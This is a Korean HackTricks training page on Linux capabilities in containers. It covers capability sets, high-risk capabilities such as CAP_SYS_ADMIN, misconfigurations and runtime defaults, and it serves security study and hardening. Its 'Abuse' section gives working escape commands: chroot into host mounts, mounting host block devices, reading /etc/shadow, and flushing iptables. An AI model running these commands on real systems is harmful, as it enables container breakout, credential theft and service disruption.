# 컨테이너 내 Linux Capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## 개요

Linux capabilities는 컨테이너 security에서 가장 중요한 요소 중 하나입니다. 다음과 같이 미묘하지만 근본적인 질문에 답하기 때문입니다: **컨테이너 내부에서 "root"는 실제로 무엇을 의미하는가?** 일반적인 Linux 시스템에서는 UID 0이 역사적으로 매우 광범위한 privilege set을 의미했습니다. 최신 kernel에서는 이 privilege가 capabilities라는 더 작은 단위로 분해됩니다. 관련 capabilities가 제거되었다면, process는 root로 실행되더라도 강력한 작업 중 상당수를 수행하지 못할 수 있습니다.

컨테이너는 이러한 구분에 크게 의존합니다. 호환성 또는 단순성 때문에 많은 workload가 컨테이너 내부에서 여전히 UID 0으로 실행됩니다. Capability dropping이 없다면 이는 지나치게 위험합니다. Capability dropping을 적용하면 containerized root process는 일반적인 in-container 작업을 수행하면서도 더 민감한 kernel operation은 거부될 수 있습니다. 따라서 `uid=0(root)`라고 표시되는 container shell이 자동으로 "host root" 또는 "광범위한 kernel privilege"를 의미하지는 않습니다. 해당 root identity가 실제로 어느 정도의 권한을 갖는지는 capability set이 결정합니다.

전체 Linux capability reference와 다양한 abuse 예시는 다음을 참조하세요:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## 동작

Capabilities는 permitted, effective, inheritable, ambient, bounding set을 포함한 여러 set으로 추적됩니다. 많은 컨테이너 assessment에서는 각 set의 정확한 kernel semantics보다 다음과 같은 최종적인 실무 질문이 더 중요합니다: **이 process가 지금 실제로 성공적으로 수행할 수 있는 privileged operation은 무엇이며, 앞으로 privilege gain이 가능한 부분은 무엇인가?**

이것이 중요한 이유는 많은 breakout technique이 실제로는 container 문제로 위장된 capability 문제이기 때문입니다. `CAP_SYS_ADMIN`이 있는 workload는 일반적인 container root process가 접근해서는 안 되는 방대한 kernel functionality에 접근할 수 있습니다. `CAP_NET_ADMIN`이 있는 workload가 host network namespace도 공유한다면 훨씬 더 위험해집니다. `CAP_SYS_PTRACE`가 있는 workload가 host PID sharing을 통해 host process를 볼 수 있다면 더욱 주목할 만한 대상이 됩니다. Docker 또는 Podman에서는 이것이 `--pid=host`로 나타날 수 있으며, Kubernetes에서는 일반적으로 `hostPID: true`로 나타납니다.

즉, capability set은 단독으로 평가할 수 없습니다. namespaces, seccomp, MAC policy와 함께 해석해야 합니다.

## 실습

컨테이너 내부에서 capabilities를 확인하는 매우 직접적인 방법은 다음과 같습니다:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
더 제한적인 컨테이너와 모든 capabilities가 추가된 컨테이너를 비교할 수도 있습니다:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
범위를 좁혀 추가했을 때의 효과를 확인하려면, 모든 것을 제거한 다음 capability 하나만 다시 추가해 보세요:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
이러한 작은 실험은 runtime이 단순히 "privileged"라는 boolean을 켜고 끄는 것이 아님을 보여 줍니다. runtime은 process에 실제로 제공되는 privilege surface를 구성합니다.

## High-Risk Capabilities

대상에 따라 여러 capability가 중요할 수 있지만, container escape 분석에서 반복적으로 관련되는 몇 가지가 있습니다.

**`CAP_SYS_ADMIN`**은 defenders가 가장 의심해야 할 capability입니다. mount 관련 작업, namespace에 민감한 동작, 그리고 container에 함부로 노출해서는 안 되는 다양한 kernel 경로를 포함해 막대한 기능을 해제하기 때문에 흔히 "the new root"라고 설명됩니다. container에 `CAP_SYS_ADMIN`, 약한 seccomp, 강력한 MAC confinement 부재가 함께 존재하면 많은 classic breakout paths가 훨씬 현실적인 가능성이 됩니다.

**`CAP_SYS_PTRACE`**는 process visibility가 존재할 때 중요하며, 특히 PID namespace를 host 또는 흥미로운 인접 workload와 공유하는 경우 더욱 그렇습니다. visibility를 tampering으로 전환할 수 있습니다.

**`CAP_NET_ADMIN`**과 **`CAP_NET_RAW`**는 network 중심 환경에서 중요합니다. 격리된 bridge network에서도 이미 위험할 수 있지만, shared host network namespace에서는 workload가 host networking을 재구성하거나, sniff, spoof, 또는 local traffic flow를 방해할 수 있으므로 훨씬 더 위험합니다.

**`CAP_SYS_MODULE`**은 rootful environment에서 일반적으로 치명적입니다. kernel module을 loading하는 것은 사실상 host-kernel control이기 때문입니다. general-purpose container workload에는 거의 절대 포함되어서는 안 됩니다.

## Runtime Usage

Docker, Podman, containerd-based stack, CRI-O는 모두 capability control을 사용하지만, 기본값과 management interface는 서로 다릅니다. Docker는 `--cap-drop` 및 `--cap-add`와 같은 flag를 통해 이를 매우 직접적으로 노출합니다. Podman은 유사한 control을 제공하며, rootless execution을 추가적인 safety layer로 활용하는 경우가 많습니다. Kubernetes는 Pod 또는 container의 `securityContext`를 통해 capability addition 및 drop을 노출합니다. LXC/Incus와 같은 system-container environment도 capability control에 의존하지만, 이러한 system의 더 광범위한 host integration 때문에 operator가 app-container environment에서보다 더 공격적으로 기본값을 완화하게 되는 경우가 많습니다.

동일한 원칙이 모두에게 적용됩니다. 기술적으로 부여할 수 있는 capability라고 해서 반드시 부여해야 하는 것은 아닙니다. 실제 incident의 상당수는 workload가 더 엄격한 configuration에서 동작하지 않자 team이 빠른 해결책을 필요로 했고, operator가 namespace, seccomp, mount의 영향을 함께 이해하지 않은 채 capability를 추가하면서 시작됩니다.

## Misconfigurations

가장 명백한 실수는 Docker/Podman-style CLI에서 **`--cap-add=ALL`**을 사용하는 것이지만, 이것이 유일한 문제는 아닙니다. 실제로는 하나 또는 두 개의 매우 강력한 capability, 특히 `CAP_SYS_ADMIN`을 namespace, seccomp, mount의 영향을 이해하지 않은 채 "application을 동작시키기 위해" 부여하는 것이 더 일반적인 문제입니다. 또 다른 흔한 failure mode는 extra capability를 host namespace sharing과 조합하는 것입니다. Docker 또는 Podman에서는 `--pid=host`, `--network=host`, `--userns=host`로 나타날 수 있으며, Kubernetes에서는 일반적으로 `hostPID: true` 또는 `hostNetwork: true`와 같은 workload setting을 통해 동등한 exposure가 발생합니다. 이러한 조합은 capability가 실제로 영향을 줄 수 있는 대상을 바꿉니다.

또한 workload가 완전히 `--privileged` 상태가 아니므로 여전히 의미 있게 제한되어 있다고 administrator가 생각하는 경우도 흔합니다. 때로는 사실이지만, 때로는 effective posture가 이미 privileged에 충분히 가까워 operationally 그 차이가 중요하지 않게 됩니다.

## Abuse

첫 번째 practical step은 effective capability set을 enumerate한 다음, escape 또는 host information access에 영향을 줄 수 있는 capability-specific action을 즉시 test하는 것입니다:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
`CAP_SYS_ADMIN`이 있으면 mount 기반 abuse와 host filesystem 접근을 먼저 테스트하세요. 이는 가장 흔한 breakout enabler 중 하나이기 때문입니다:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
`CAP_SYS_PTRACE`가 있고 container에서 흥미로운 process를 볼 수 있다면, 해당 capability를 process inspection으로 전환할 수 있는지 확인합니다:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
`CAP_NET_ADMIN` 또는 `CAP_NET_RAW`가 있으면 워크로드가 가시 네트워크 스택을 조작할 수 있는지, 또는 최소한 유용한 네트워크 정보를 수집할 수 있는지 테스트합니다:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Capability test가 성공하면 이를 namespace 상황과 함께 판단해야 합니다. 격리된 namespace에서는 단순히 위험해 보이는 capability라도, 컨테이너가 host PID, host network 또는 host mounts를 함께 공유하는 경우 즉시 escape 또는 host-recon primitive가 될 수 있습니다.

### 전체 예시: `CAP_SYS_ADMIN` + Host Mount = Host Escape

컨테이너에 `CAP_SYS_ADMIN`과 `/host`와 같은 host filesystem의 writable bind mount가 있다면, escape 경로는 대개 간단합니다:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
`chroot`가 성공하면 이제 명령이 호스트 root filesystem 컨텍스트에서 실행됩니다:
```bash
id
hostname
cat /etc/shadow | head
```
`chroot`를 사용할 수 없는 경우, 마운트된 트리를 통해 바이너리를 호출하면 동일한 결과를 얻을 수 있는 경우가 많습니다:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### 전체 예시: `CAP_SYS_ADMIN` + Device Access

호스트의 block device가 노출된 경우, `CAP_SYS_ADMIN`을 사용하면 이를 통해 호스트 filesystem에 직접 접근할 수 있습니다:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### 전체 예시: `CAP_NET_ADMIN` + Host Networking

이 조합이 항상 직접적으로 host root를 제공하는 것은 아니지만, 호스트 network stack을 완전히 재구성할 수 있습니다:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
이는 서비스 거부, 트래픽 가로채기 또는 이전에 필터링되던 서비스에 대한 접근을 가능하게 할 수 있습니다.

## Checks

capability checks의 목표는 단순히 원시 값을 덤프하는 것뿐만 아니라, 해당 process가 현재 namespace 및 mount 상황을 위험하게 만들 만큼 충분한 privilege를 보유하고 있는지 이해하는 것입니다.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
여기서 중요한 점:

- `capsh --print`는 `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` 또는 `cap_sys_module`과 같은 high-risk capabilities를 확인하는 가장 쉬운 방법입니다.
- `/proc/self/status`의 `CapEff` 줄은 다른 set에서 사용 가능할 수 있는 항목이 아니라, 현재 실제로 effective한 항목을 보여 줍니다.
- container가 host PID, network 또는 user namespaces를 공유하거나 writable host mounts를 가지고 있다면 capability dump는 훨씬 더 중요해집니다.

raw capability 정보를 수집한 후 다음 단계는 해석입니다. process가 root인지, user namespaces가 활성화되어 있는지, host namespaces가 공유되는지, seccomp가 enforcing 상태인지, AppArmor 또는 SELinux가 여전히 process를 제한하는지 확인해야 합니다. capability set만으로는 전체 상황을 판단할 수 없지만, 동일하게 보이는 starting point에서 한 container breakout은 성공하고 다른 하나는 실패하는 이유를 설명해 주는 경우가 많습니다.

## Runtime Defaults

| Runtime / platform | 기본 상태 | 기본 동작 | 일반적인 수동 약화 방법 |
| --- | --- | --- | --- |
| Docker Engine | 기본적으로 reduced capability set | Docker는 capabilities의 기본 allowlist를 유지하고 나머지는 제거합니다 | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | 기본적으로 reduced capability set | Podman containers는 기본적으로 unprivileged 상태이며 reduced capability model을 사용합니다 | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | 변경하지 않으면 runtime defaults를 상속 | `securityContext.capabilities`가 지정되지 않으면 container는 runtime에서 제공하는 기본 capability set을 얻습니다 | `securityContext.capabilities.add`, `drop: [\"ALL\"]`을 설정하지 않는 것, `privileged: true` |
| Kubernetes에서의 containerd / CRI-O | 일반적으로 runtime default | effective set은 runtime과 Pod spec에 따라 결정됩니다 | Kubernetes 행과 동일하며, direct OCI/CRI configuration에서도 capabilities를 명시적으로 추가할 수 있습니다 |

Kubernetes에서 중요한 점은 API가 하나의 universal default capability set을 정의하지 않는다는 것입니다. Pod에서 capabilities를 추가하거나 제거하지 않으면 해당 workload는 node의 runtime default를 상속합니다.
{{#include ../../../../banners/hacktricks-training.md}}
